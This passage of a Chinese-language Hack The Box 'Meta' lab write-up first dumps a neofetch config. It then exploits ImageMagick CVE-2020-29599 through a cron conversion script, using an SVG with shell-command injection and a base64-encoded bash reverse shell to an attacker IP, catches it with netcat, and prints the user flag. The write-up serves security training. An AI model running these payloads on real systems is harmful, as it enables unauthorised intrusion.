class="hljs-comment"># &#x27;mpc&#x27; arguments (specify a host, password etc).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;&#x27;</span><br><span class="hljs-comment"># Example: mpc_args=(-h HOST -P PASSWORD)</span><br>mpc_args=()<br><br><br><span class="hljs-comment"># Text Colors</span><br><br><br><span class="hljs-comment"># Text Colors</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;distro&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;distro&#x27;, &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --colors</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Each number represents a different part of the text in</span><br><span class="hljs-comment"># this order: &#x27;title&#x27;, &#x27;@&#x27;, &#x27;underline&#x27;, &#x27;subtitle&#x27;, &#x27;colon&#x27;, &#x27;info&#x27;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># colors=(distro)      - Text is colored based on Distro colors.</span><br><span class="hljs-comment"># colors=(4 6 1 8 8 6) - Text is colored in the order above.</span><br>colors=(distro)<br><br><br><span class="hljs-comment"># Text Options</span><br><br><br><span class="hljs-comment"># Toggle bold text</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --bold</span><br>bold=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Enable/Disable Underline</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --underline</span><br>underline_enabled=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Underline character</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;-&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;string&#x27;</span><br><span class="hljs-comment"># Flag:     --underline_char</span><br>underline_char=<span class="hljs-string">&quot;-&quot;</span><br><br><br><span class="hljs-comment"># Info Separator</span><br><span class="hljs-comment"># Replace the default separator with the specified string.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;:&#x27;</span><br><span class="hljs-comment"># Flag:     --separator</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># separator=&quot;-&gt;&quot;:   &#x27;Shell-&gt; bash&#x27;</span><br><span class="hljs-comment"># separator=&quot; =&quot;:   &#x27;WM = dwm&#x27;</span><br>separator=<span class="hljs-string">&quot;:&quot;</span><br><br><br><span class="hljs-comment"># Color Blocks</span><br><br><br><span class="hljs-comment"># Color block range</span><br><span class="hljs-comment"># The range of colors to print.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;0&#x27;, &#x27;7&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --block_range</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Display colors 0-7 in the blocks.  (8 colors)</span><br><span class="hljs-comment"># neofetch --block_range 0 7</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Display colors 0-15 in the blocks. (16 colors)</span><br><span class="hljs-comment"># neofetch --block_range 0 15</span><br>block_range=(0 7)<br><br><span class="hljs-comment"># Toggle color blocks</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --color_blocks</span><br>color_blocks=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Color block width in spaces</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;3&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --block_width</span><br>block_width=3<br><br><span class="hljs-comment"># Color block height in lines</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;1&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --block_height</span><br>block_height=1<br><br><br><span class="hljs-comment"># Progress Bars</span><br><br><br><span class="hljs-comment"># Bar characters</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;-&#x27;, &#x27;=&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;string&#x27;, &#x27;string&#x27;</span><br><span class="hljs-comment"># Flag:     --bar_char</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># neofetch --bar_char &#x27;elapsed&#x27; &#x27;total&#x27;</span><br><span class="hljs-comment"># neofetch --bar_char &#x27;-&#x27; &#x27;=&#x27;</span><br>bar_char_elapsed=<span class="hljs-string">&quot;-&quot;</span><br>bar_char_total=<span class="hljs-string">&quot;=&quot;</span><br><br><span class="hljs-comment"># Toggle Bar border</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --bar_border</span><br>bar_border=<span class="hljs-string">&quot;on&quot;</span><br><br><span class="hljs-comment"># Progress bar length in spaces</span><br><span class="hljs-comment"># Number of chars long to make the progress bars.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;15&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --bar_length</span><br>bar_length=15<br><br><span class="hljs-comment"># Progress bar colors</span><br><span class="hljs-comment"># When set to distro, uses your distro&#x27;s logo colors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;distro&#x27;, &#x27;distro&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;distro&#x27;, &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --bar_colors</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># neofetch --bar_colors 3 4</span><br><span class="hljs-comment"># neofetch --bar_colors distro 5</span><br>bar_color_elapsed=<span class="hljs-string">&quot;distro&quot;</span><br>bar_color_total=<span class="hljs-string">&quot;distro&quot;</span><br><br><br><span class="hljs-comment"># Info display</span><br><span class="hljs-comment"># Display a bar with the info.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;bar&#x27;, &#x27;infobar&#x27;, &#x27;barinfo&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flags:   --cpu_display</span><br><span class="hljs-comment">#          --memory_display</span><br><span class="hljs-comment">#          --battery_display</span><br><span class="hljs-comment">#          --disk_display</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># bar:     &#x27;[---=======]&#x27;</span><br><span class="hljs-comment"># infobar: &#x27;info [---=======]&#x27;</span><br><span class="hljs-comment"># barinfo: &#x27;[---=======] info&#x27;</span><br><span class="hljs-comment"># off:     &#x27;info&#x27;</span><br>cpu_display=<span class="hljs-string">&quot;off&quot;</span><br>memory_display=<span class="hljs-string">&quot;off&quot;</span><br>battery_display=<span class="hljs-string">&quot;off&quot;</span><br>disk_display=<span class="hljs-string">&quot;off&quot;</span><br><br><br><span class="hljs-comment"># Backend Settings</span><br><br><br><span class="hljs-comment"># Image backend.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;ascii&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;ascii&#x27;, &#x27;caca&#x27;, &#x27;chafa&#x27;, &#x27;jp2a&#x27;, &#x27;iterm2&#x27;, &#x27;off&#x27;,</span><br><span class="hljs-comment">#           &#x27;termpix&#x27;, &#x27;pixterm&#x27;, &#x27;tycat&#x27;, &#x27;w3m&#x27;, &#x27;kitty&#x27;</span><br><span class="hljs-comment"># Flag:     --backend</span><br>image_backend=<span class="hljs-string">&quot;ascii&quot;</span><br><br><span class="hljs-comment"># Image Source</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Which image or ascii file to display.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;auto&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;auto&#x27;, &#x27;ascii&#x27;, &#x27;wallpaper&#x27;, &#x27;/path/to/img&#x27;, &#x27;/path/to/ascii&#x27;, &#x27;/path/to/dir/&#x27;</span><br><span class="hljs-comment">#           &#x27;command output (neofetch --ascii &quot;$(fortune | cowsay -W 30)&quot;)&#x27;</span><br><span class="hljs-comment"># Flag:     --source</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> &#x27;auto&#x27; will pick the best image source for whatever image backend is used.</span><br><span class="hljs-comment">#       In ascii mode, distro ascii art will be used and in an image mode, your</span><br><span class="hljs-comment">#       wallpaper will be used.</span><br>image_source=<span class="hljs-string">&quot;auto&quot;</span><br><br><br><span class="hljs-comment"># Ascii Options</span><br><br><br><span class="hljs-comment"># Ascii distro</span><br><span class="hljs-comment"># Which distro&#x27;s ascii art to display.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;auto&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;auto&#x27;, &#x27;distro_name&#x27;</span><br><span class="hljs-comment"># Flag:    --ascii_distro</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Arch and Ubuntu have &#x27;old&#x27; logo variants.</span><br><span class="hljs-comment">#       Change this to &#x27;arch_old&#x27; or &#x27;ubuntu_old&#x27; to use the old logos.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Ubuntu has flavor variants.</span><br><span class="hljs-comment">#       Change this to &#x27;Lubuntu&#x27;, &#x27;Xubuntu&#x27;, &#x27;Ubuntu-GNOME&#x27; or &#x27;Ubuntu-Budgie&#x27; to use the flavors.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Arch, Crux and Gentoo have a smaller logo variant.</span><br><span class="hljs-comment">#       Change this to &#x27;arch_small&#x27;, &#x27;crux_small&#x27; or &#x27;gentoo_small&#x27; to use the small logos.</span><br>ascii_distro=<span class="hljs-string">&quot;auto&quot;</span><br><br><span class="hljs-comment"># Ascii Colors</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;distro&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;distro&#x27;, &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27; &#x27;num&#x27;</span><br><span class="hljs-comment"># Flag:     --ascii_colors</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example:</span><br><span class="hljs-comment"># ascii_colors=(distro)      - Ascii is colored based on Distro colors.</span><br><span class="hljs-comment"># ascii_colors=(4 6 1 8 8 6) - Ascii is colored using these colors.</span><br>ascii_colors=(distro)<br><br><span class="hljs-comment"># Bold ascii logo</span><br><span class="hljs-comment"># Whether or not to bold the ascii logo.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;on&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:    --ascii_bold</span><br>ascii_bold=<span class="hljs-string">&quot;on&quot;</span><br><br><br><span class="hljs-comment"># Image Options</span><br><br><br><span class="hljs-comment"># Image loop</span><br><span class="hljs-comment"># Setting this to on will make neofetch redraw the image constantly until</span><br><span class="hljs-comment"># Ctrl+C is pressed. This fixes display issues in some terminal emulators.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;off&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;on&#x27;, &#x27;off&#x27;</span><br><span class="hljs-comment"># Flag:     --loop</span><br>image_loop=<span class="hljs-string">&quot;off&quot;</span><br><br><span class="hljs-comment"># Thumbnail directory</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;~/.cache/thumbnails/neofetch&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;dir&#x27;</span><br>thumbnail_dir=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XDG_CACHE_HOME:-<span class="hljs-variable">$&#123;HOME&#125;</span>/.cache&#125;</span>/thumbnails/neofetch&quot;</span><br><br><span class="hljs-comment"># Crop mode</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;normal&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;normal&#x27;, &#x27;fit&#x27;, &#x27;fill&#x27;</span><br><span class="hljs-comment"># Flag:     --crop_mode</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See this wiki page to learn about the fit and fill options.</span><br><span class="hljs-comment"># https://github.com/dylanaraps/neofetch/wiki/What-is-Waifu-Crop%3F</span><br>crop_mode=<span class="hljs-string">&quot;normal&quot;</span><br><br><span class="hljs-comment"># Crop offset</span><br><span class="hljs-comment"># Note: Only affects &#x27;normal&#x27; crop mode.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default:  &#x27;center&#x27;</span><br><span class="hljs-comment"># Values:   &#x27;northwest&#x27;, &#x27;north&#x27;, &#x27;northeast&#x27;, &#x27;west&#x27;, &#x27;center&#x27;</span><br><span class="hljs-comment">#           &#x27;east&#x27;, &#x27;southwest&#x27;, &#x27;south&#x27;, &#x27;southeast&#x27;</span><br><span class="hljs-comment"># Flag:     --crop_offset</span><br>crop_offset=<span class="hljs-string">&quot;center&quot;</span><br><br><span class="hljs-comment"># Image size</span><br><span class="hljs-comment"># The image is half the terminal width by default.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;auto&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;auto&#x27;, &#x27;00px&#x27;, &#x27;00%&#x27;, &#x27;none&#x27;</span><br><span class="hljs-comment"># Flags:   --image_size</span><br><span class="hljs-comment">#          --size</span><br>image_size=<span class="hljs-string">&quot;auto&quot;</span><br><br><span class="hljs-comment"># Gap between image and text</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;3&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;num&#x27;, &#x27;-num&#x27;</span><br><span class="hljs-comment"># Flag:    --gap</span><br>gap=3<br><br><span class="hljs-comment"># Image offsets</span><br><span class="hljs-comment"># Only works with the w3m backend.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;0&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;px&#x27;</span><br><span class="hljs-comment"># Flags:   --xoffset</span><br><span class="hljs-comment">#          --yoffset</span><br>yoffset=0<br>xoffset=0<br><br><span class="hljs-comment"># Image background color</span><br><span class="hljs-comment"># Only works with the w3m backend.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Default: &#x27;&#x27;</span><br><span class="hljs-comment"># Values:  &#x27;color&#x27;, &#x27;blue&#x27;</span><br><span class="hljs-comment"># Flag:    --bg_color</span><br>background_color=<br><br><br><span class="hljs-comment"># Misc Options</span><br><br><span class="hljs-comment"># Stdout mode</span><br><span class="hljs-comment"># Turn off all colors and disables image backend (ASCII/Image).</span><br><span class="hljs-comment"># Useful for piping into another command.</span><br><span class="hljs-comment"># Default: &#x27;off&#x27;</span><br><span class="hljs-comment"># Values: &#x27;on&#x27;, &#x27;off&#x27;</span><br>stdout=<span class="hljs-string">&quot;off&quot;</span><br>www-data@meta:/tmp$ <br><br>www-data@meta:/tmp$ <span class="hljs-built_in">cat</span> /usr/local/bin/convert_images.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null<br>pkill mogrify<br>www-data@meta:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>22、在脚本里发现了个命令，和涉及一个程序，我们继续查看下这个程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/tmp$ <span class="hljs-built_in">ls</span> -la /usr/local/bin/mogrify<br>lrwxrwxrwx 1 root root 6 Aug 29  2021 /usr/local/bin/mogrify -&gt; magick<br>www-data@meta:/tmp$ /usr/local/bin/mogrify -version<br>Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org<br>Copyright: © 1999-2020 ImageMagick Studio LLC<br>License: https://imagemagick.org/script/license.php<br>Features: Cipher DPC HDRI OpenMP(4.5) <br>Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib<br>www-data@meta:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>23、这里发现了这个软件和版本，那就搜下漏洞吧</p>
+<p><code>ImageMagick 7.0.10-36 漏洞</code></p>
+<p><img src="/Users/shiyan/E-disk/my-blog/%E5%8D%9A%E5%AE%A2%E8%8D%89%E7%A8%BF%E6%96%87%E4%BB%B6%E5%A4%B9/Meta-htb-writeup-20240130/Meta-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>CVE-2020-29599</code></p>
+<p><code>https://blog.csdn.net/zzzzz1284/article/details/129496149</code></p>
+<p><code>https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2020-29599/poc.svg</code></p>
+<p>24、那就按照上述提示，漏洞利用吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.11.140 - - [30/Jan/2024 14:35:16] <span class="hljs-string">&quot;GET /poc.svg HTTP/1.1&quot;</span> 200 -<br><br>www-data@meta:/tmp$ wget http://10.10.14.4/poc.svg<br>--2024-01-30 01:35:15--  http://10.10.14.4/poc.svg<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 398 [image/svg+xml]<br>Saving to: <span class="hljs-string">&#x27;poc.svg&#x27;</span><br><br>poc.svg             100%[===================&gt;]     398  --.-KB/s    <span class="hljs-keyword">in</span> 0.004s  <br><br>2024-01-30 01:35:16 (87.4 KB/s) - <span class="hljs-string">&#x27;poc.svg&#x27;</span> saved [398/398]<br><br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span><br>poc.svg  pspy64<br>www-data@meta:/tmp$ <br><br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span><br>poc.svg  pspy64<br>www-data@meta:/tmp$ identify poc.svg<br>poc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.004<br>www-data@meta:/tmp$ convert poc.svg poc.png<br>sh: 1: : Permission denied<br>convert: MagickCore/image.c:1168: DestroyImage: Assertion `image != (Image *) NULL<span class="hljs-string">&#x27; failed.</span><br><span class="hljs-string">Aborted</span><br><span class="hljs-string">www-data@meta:/tmp$ </span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@meta:/tmp$ ls</span><br><span class="hljs-string">0wned  poc.svg  pspy64</span><br><span class="hljs-string">www-data@meta:/tmp$ cat 0wned </span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">www-data@meta:/tmp$ </span><br></code></pre></td></tr></table></figure>
+
+<p>25、这里查看这个 poc.svg 的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">cat</span> poc.svg <br>&lt;image authenticate=<span class="hljs-string">&#x27;ff&quot; `echo $(id)&gt; ./0wned`;&quot;&#x27;</span>&gt;<br>  &lt;<span class="hljs-built_in">read</span> filename=<span class="hljs-string">&quot;pdf:/etc/passwd&quot;</span>/&gt;<br>  &lt;get width=<span class="hljs-string">&quot;base-width&quot;</span> height=<span class="hljs-string">&quot;base-height&quot;</span> /&gt;<br>  &lt;resize geometry=<span class="hljs-string">&quot;400x400&quot;</span> /&gt;<br>  &lt;write filename=<span class="hljs-string">&quot;test.png&quot;</span> /&gt;<br>  &lt;svg width=<span class="hljs-string">&quot;700&quot;</span> height=<span class="hljs-string">&quot;700&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;       <br>  &lt;image xlink:href=<span class="hljs-string">&quot;msl:poc.svg&quot;</span> height=<span class="hljs-string">&quot;100&quot;</span> width=<span class="hljs-string">&quot;100&quot;</span>/&gt;<br>  &lt;/svg&gt;<br>&lt;/image&gt;  <br></code></pre></td></tr></table></figure>
+
+<p>26、感觉是方法用的，这里需要结合上面的漏洞的那个进程进行操作的，这里修改下poc吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash  -i &gt;&amp; /dev/tcp/10.10.14.4/10086 0&gt;&amp;1 &#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC8xMDA4NiAwPiYxIAo=<br><br><span class="hljs-comment"># 把poc.svg修改为下面的内容</span><br><br>&lt;image authenticate=<span class="hljs-string">&#x27;ff&quot; `echo &quot;YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC8xMDA4NiAwPiYxIAo=&quot; | base64 -d | bash`;&quot;&#x27;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>27、开始修改漏洞利用脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/tmp$ <br>www-data@meta:/tmp$ vim poc.svg <br>www-data@meta:/tmp$ <span class="hljs-built_in">cat</span> poc.svg <br>&lt;image authenticate=<span class="hljs-string">&#x27;ff&quot; `echo &quot;YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC8xMDA4NiAwPiYxIAo=&quot; | base64 -d | bash`;&quot;&#x27;</span>&gt;<br>  &lt;<span class="hljs-built_in">read</span> filename=<span class="hljs-string">&quot;pdf:/etc/passwd&quot;</span>/&gt;<br>  &lt;get width=<span class="hljs-string">&quot;base-width&quot;</span> height=<span class="hljs-string">&quot;base-height&quot;</span> /&gt;<br>  &lt;resize geometry=<span class="hljs-string">&quot;400x400&quot;</span> /&gt;<br>  &lt;write filename=<span class="hljs-string">&quot;test.png&quot;</span> /&gt;<br>  &lt;svg width=<span class="hljs-string">&quot;700&quot;</span> height=<span class="hljs-string">&quot;700&quot;</span> xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span> xmlns:xlink=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;       <br>  &lt;image xlink:href=<span class="hljs-string">&quot;msl:poc.svg&quot;</span> height=<span class="hljs-string">&quot;100&quot;</span> width=<span class="hljs-string">&quot;100&quot;</span>/&gt;<br>  &lt;/svg&gt;<br>&lt;/image&gt;<br>www-data@meta:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>28、开始尝试利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@meta:/tmp$ <span class="hljs-built_in">cp</span> /tmp/poc.svg /var/www/dev01.artcorp.htb/convert_images/<br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span> -la /var/www/dev01.artcorp.htb/convert_images/<br>total 8<br>drwxrwxr-x 2 root www-data 4096 Jan  4  2022 .<br>drwxr-xr-x 4 root root     4096 Oct 18  2021 ..<br>&lt;/poc.svg /var/www/dev01.artcorp.htb/convert_images/<br>www-data@meta:/tmp$ <span class="hljs-built_in">ls</span> -la /var/www/dev01.artcorp.htb/convert_images/<br>total 12<br>drwxrwxr-x 2 root     www-data 4096 Jan 30 01:49 .<br>drwxr-xr-x 4 root     root     4096 Oct 18  2021 ..<br>-rw-r--r-- 1 www-data www-data  466 Jan 30 01:49 poc.svg<br>www-data@meta:/tmp$ <br></code></pre></td></tr></table></figure>
+
+<p>29、成功获取到目标用户权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.4] from (UNKNOWN) [10.10.11.140] 50490<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (4687): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1000(thomas) gid=1000(thomas) <span class="hljs-built_in">groups</span>=1000(thomas)<br>thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>thomas@meta:~$ <br></code></pre></td></tr></table></figure>
+
+<p>30、获取下flag信息吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>user.txt<br>thomas@meta:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>af6d509b3bb924e92d8d08724746d4ff<br>thomas@meta:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>31、下面开始进行提权的枚举，在提权之前，先下载下ssh的秘钥，我们通过秘钥进行登录，这样枚举起来更加稳妥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 